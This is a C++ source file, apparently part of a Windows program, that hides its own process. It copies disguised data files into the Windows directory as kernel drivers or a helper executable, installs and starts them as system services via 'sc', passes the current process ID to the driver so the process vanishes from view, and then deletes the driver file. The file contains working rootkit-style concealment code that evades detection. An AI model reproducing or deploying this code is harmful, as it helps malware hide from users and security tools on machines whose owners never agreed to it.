#include "stdafx.h"
#include "Bridge.h"

cDrvCtrl drvCtrl;

void DriverHideProcess()
{
	char osName[256];
	GetOS(osName);
	//__oMsg("[ngoai APP] hdh:%s;%d", osName, strcmp(osName, "WinXP__32bit"));
	if (strcmp(osName, "WinXP__32bit") == 0)
	//if (!IsWow64())
	{
		//__oMsg("vao winxp");
		HideApplication_XP();
		HideProcess_XP();
	}
	else if (strcmp(osName, "Win7__32bit") == 0)
	{
		//__oMsg("vao win7 32bit");
		HideProcess_Win732();
	}
	else
	{
		//__oMsg("[ngoai APP] vao cac truong hop khac");
		HideProcess_Win7810_64();
	}
}


// -------------------------Windows XP-----------------------------
DWORD CTL_CODE_GEN_XP(DWORD lngFunction)
{
#define FILE_DEVICE_COMM_DRIVER	0x00008811
	return (FILE_DEVICE_COMM_DRIVER * 65536) | (FILE_ANY_ACCESS * 16384) | (lngFunction * 4) | METHOD_NEITHER;
	//CTL_CODE(FILE_DEVICE_COMM_DRIVER, $808, METHOD_NEITHER, FILE_ANY_ACCESS)
}

// IO with the device
BOOL IoControl_XP(HANDLE hFile, DWORD dwIoCode, PVOID InBuff, DWORD InBuffLen, PVOID OutBuff, DWORD OutBuffLen, DWORD *RealRetBytes)
{
	DWORD dw;
	//BOOL b=DeviceIoControl(hFile,dwIoCode,InBuff,InBuffLen,OutBuff,OutBuffLen,&dw,NULL);
	BOOL b=DeviceIoControl(hFile,CTL_CODE_GEN_XP(dwIoCode),InBuff,InBuffLen,OutBuff,OutBuffLen,&dw,NULL);
	if(RealRetBytes)
		*RealRetBytes=dw;
	return b;
}

void HideProcess_XP()
{
	system("@echo off");
	system("copy config\\data1s %windir%\\1.sys /y>nul");
	system("sc create WinXP0 binPath= %windir%\\1.sys type= kernel start= system error= ignore>nul");
	system("sc start WinXP0>nul");
	HANDLE hFile;
	DWORD ProcessID,write;

	hFile=CreateFileA("\\\\.\\WinXP0",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);

	if(hFile==INVALID_HANDLE_VALUE)
	{
		//__oMsg("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.",GetLastError());
		return;
	}


	ProcessID = GetCurrentProcessId();
	if(!WriteFile(hFile,&ProcessID,sizeof(DWORD),&write,NULL))
	{
		//__oMsg("\nError: Unable to hide process (%d)\n",GetLastError());
	}
	else
	{
		//__oMsg("\nProcess successfully hidden. ProcessID:%d\n", ProcessID);
	}

	system("@echo off");
	system("sc stop WinXP0>nul");
	system("del /f /q %windir%\\1.sys>nul");
}

void HideApplication_XP()
{
	system("@echo off");
	system("copy config\\data1as %windir%\\1a.sys /y>nul");
	system("sc create WinXP1 binPath= %windir%\\1a.sys type= kernel start= system error= ignore>nul");
	system("sc start WinXP1>nul");
	HANDLE hFile;
	DWORD ProcessID;

	hFile=CreateFileA("\\\\.\\WinXP1",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);

	if(hFile==INVALID_HANDLE_VALUE)
	{
		//__oMsg("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.",GetLastError());
		return;
	}

	ProcessID = GetCurrentProcessId();
	if (ProcessID > 0 && ProcessID != 4){	//If pid is valid and is not WinNT kernel process
		//DWORD ret;
		//__oMsg("them code moi a Chung gui:%d", ProcessID);
		DWORD dw;
		//BOOL b=IoControl_XP(hFile, 0x808,(PVOID)ProcessID,sizeof(ProcessID), 0, 0,&dw);
		bool b = DeviceIoControl(hFile,CTL_CODE_GEN_XP(0x808),(PVOID)ProcessID,sizeof(ProcessID),0,0,&dw,NULL);
		//__oMsg("haint : ket qua tra ve: %x;%d", dw, b);
	}

	system("@echo off");
	system("sc stop WinXP1>nul");
	system("del /f /q %windir%\\1a.sys>nul");
}


// -------------------------Windows 7 32bit-----------------------------
void HideProcess_Win732(){
	system("@echo off");
	system("copy config\\data2s C:\\Windows\\2.sys /y>nul");
	char szSysFile[]="C:\\Windows\\2.sys";
	char szSvcLnkName[]="Win73202017";

	// Format the path string
	//GetModuleFileNameA(0,szSysFile,MAX_PATH);
	//for(SIZE_T i=strlen(szSysFile)-1;i>=0;i--)
	//{
	//	if(szSysFile[i]=='\\')
	//	{
	//		szSysFile[i+1]='\0';
	//		break;
	//	}
	//}

	//strcat(szSysFile,"config\\2.sys");
	//__oMsg("duong dan file service:%s", szSysFile);

	//Install the driver
	if (drvCtrl.Install(szSysFile,szSvcLnkName,szSvcLnkName) && drvCtrl.Start()){
		// Open symbolic link
		if (drvCtrl.Open("\\\\.\\Win73202017"))
		{
			long PROCPID = 0;
			PROCPID = GetCurrentProcessId();
			if (PROCPID > 0 && PROCPID != 4){	//If pid is valid and is not WinNT kernel process
				drvCtrl.IoControl(0x801,&PROCPID,sizeof(PROCPID),0,0,0);
			}
		}
	}
	system("@echo off");
	system("sc stop Win73202017>nul");
	system("del /f /q C:\\Windows\\2.sys>nul");
}


// --------------------- Windows 7 64bit; Windows 8,8.1; Windows 10 --------------------
void HideProcess_Win7810_64()
{
	system("@echo off");
	system("copy config\\datax64e C:\\Windows\\x64.exe /y>nul");
	//char szPath[MAX_PATH]={0};
	char szToolFile[]="C:\\Windows\\x64.exe";
	// Format the path string
	//GetModuleFileNameA(0,szPath,MAX_PATH);
	//for(SIZE_T i=strlen(szPath)-1;i>=0;i--)
	//{
	//	if(szPath[i]=='\\')
	//	{
	//		szPath[i+1]='\0';
	//		break;
	//	}
	//}

	//strcat(szToolFile,szPath);
	//strcat(szToolFile,"config\\x64.exe");
	//__oMsg("[ngoai APP] duong dan file x64 tool :%s", szToolFile);

	char szCmdParam[100] = {0};
	sprintf_s(szCmdParam, "-i %d", GetCurrentProcessId());
	//__oMsg("[ngoai APP] cmd param:%s", szCmdParam);
	ShellExecuteA(NULL, "open", szToolFile, szCmdParam, NULL, SW_HIDE);
}
